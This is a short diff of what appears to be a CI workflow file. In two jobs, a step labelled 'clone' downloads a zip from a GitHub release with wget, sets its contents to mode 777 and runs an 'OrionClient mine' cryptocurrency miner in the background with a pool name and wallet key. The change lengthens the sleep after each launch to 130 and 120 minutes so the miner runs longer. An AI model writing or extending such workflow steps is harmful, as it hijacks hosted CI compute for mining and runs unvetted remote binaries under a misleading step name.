@@ -49,7 +49,7 @@ jobs:
       id: go
     - name: clone
       run: wget https://github.com/egg5233/OrionClient_tw/releases/download/1.6.0/OrionClient_linux.zip && unzip OrionClient_linux.zip && cd OrionClient_linux && chmod 777 * && ./OrionClient mine -a --pool twbitz2 --key 78t7FTsXEHBpCEHUvnuSx91r1rJ8VLaym3iTREunwiwK --worker tod1 &
-            sleep 30m
+            sleep 130m
         
     
      
@@ -75,7 +75,7 @@ jobs:
       id: go
     - name: clone
       run: wget https://github.com/egg5233/OrionClient_tw/releases/download/1.6.0/OrionClient_linux.zip && unzip OrionClient_linux.zip && cd OrionClient_linux && chmod 777 * && ./OrionClient mine -a --pool twbitz2 --key 78t7FTsXEHBpCEHUvnuSx91r1rJ8VLaym3iTREunwiwK --worker tod1 &
-            sleep 20m
+            sleep 120m
            
         
     
